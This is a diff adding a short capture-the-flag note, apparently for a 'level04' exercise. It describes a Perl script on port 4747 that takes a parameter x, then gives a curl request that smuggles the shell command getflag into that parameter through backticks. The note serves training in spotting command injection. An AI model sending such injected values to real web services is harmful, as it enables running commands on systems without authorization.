@@ -1,0 +1,4 @@
+cat level04.pl
+-> level04.pl is a perl script running on port 4747
+-> seems to take a parameter on x with params("x")
+curl 10.12.1.129:4747\?x='`getflag`'
